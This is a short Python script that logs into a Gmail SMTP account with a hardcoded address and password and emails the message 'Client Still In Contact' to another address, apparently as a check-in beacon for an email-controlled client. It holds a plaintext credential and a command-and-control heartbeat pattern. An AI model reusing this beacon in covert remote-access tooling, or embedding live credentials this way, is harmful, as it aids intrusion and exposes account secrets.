
import email
import socket
import getpass
import smtplib
import email.utils
import urllib
import imaplib
import time
import base64



from socket import gethostname, gethostbyname



server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login('DumbDumbHeadBoy@gmail.com', 'Doris12345')
mess = "Client Still In Contact"
try:
   msg =  str(mess)
except:
   print('message cannout retrive')
server.sendmail('DumbDumbHeadBoy@gmail.com', 'KickBClient@gmail.com', msg)
server.quit()
time.sleep(30)
